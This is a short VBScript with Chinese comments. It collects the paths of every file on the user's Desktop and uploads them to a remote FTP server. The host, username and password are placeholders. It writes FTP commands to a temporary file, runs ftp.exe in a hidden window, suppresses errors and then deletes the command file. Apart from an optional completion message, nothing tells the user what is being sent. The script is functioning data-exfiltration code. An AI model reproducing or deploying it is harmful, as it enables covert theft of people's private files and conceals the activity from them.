Set WshShell=Wscript.CreateObject("Wscript.Shell")
Function FilesTree(sPath)    
'遍历一个文件夹下的所有文件夹文件夹    
    Set oFso = CreateObject("Scripting.FileSystemObject")    
    Set oFolder = oFso.GetFolder(sPath)    
    Set oSubFolders = oFolder.SubFolders    
    str=""
	str1=""
    Set oFiles = oFolder.Files    
    For Each oFile In oFiles
		str=str&oFile.Path&","
    Next    
        
    ' For Each oSubFolder In oSubFolders    
        ' ' WScript.Echo oSubFolder.Path    
        ' 'oSubFolder.Delete
		' str1=str&(oSubFolder.Path&",")
        ' FilesTree(oSubFolder.Path)'递归    
    ' Next    
        
    Set oFolder = Nothing    
    Set oSubFolders = Nothing    
    Set oFso = Nothing
	FilesTree=str
End Function
s=FilesTree(WshShell.SpecialFolders("Desktop"))

ON ERROR RESUME NEXT
Set FSO=CreateObject("Scripting.FileSystemObject")
'============================================================================
'以下为配置区
'============================================================================
strComputer="xxxxx" 'FTP主机名或主机IP
strUserName="xxxx" 'FTP用户名
strPassword="xxxxx" 'FTP用户密码
strFtpDir="Record" 'FTP目录(如:"Dir/subDir")
strUpFileList=s '待上传文件的路径列表
strTip="上传完成!" '上传完成后的提示
IsTip=True '是否显示提示(值为True或False)
nTime=0 '提示显示时间（0为一直显示直到用户确认）
'============================================================================
'以下无需修改
'============================================================================
test=UpLoad(strComputer,strFtpDir,strUserName,strPassword,strUpFileList,IsTip,strTip,nTime)
'============================================================================
Function UpLoad(strComputer,strFtpDir,strUserName,strPassword,strUpFileList,IsTip,strTip,nTime)
ON ERROR RESUME NEXT
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WshShell=CreateObject("Wscript.Shell")
strFile=FSO.GetDriveName(FSO.GetSpecialFolder(0))&"\upload"
Do While FSO.FileExists(strFile&".tmp")
i=i+1
strFile=strFile&Cstr(i)
Loop
strFile=strFile&".tmp"
set f=FSO.OpenTextFile(strFile,2,True)
f.WriteLine "open "&strComputer
f.WriteLine strUserName
f.WriteLine strPassword
strFtpDirs=Split(strFtpDir,"/")
For Each strFtpDir In strFtpDirs
f.WriteLine "mkdir "&strFtpDir
f.WriteLine "cd "&strFtpDir
Next
strUpFiles=Split(strUpFileList,",")
For Each strUpFile In strUpFiles
f.WriteLine "put "&strUpFile
Next 
f.WriteLine "bye"
f.Close
WshShell.Run "ftp -s:"&strFile,vbHide,True
FSO.DeleteFile strFile
UpLoad=True
End Function

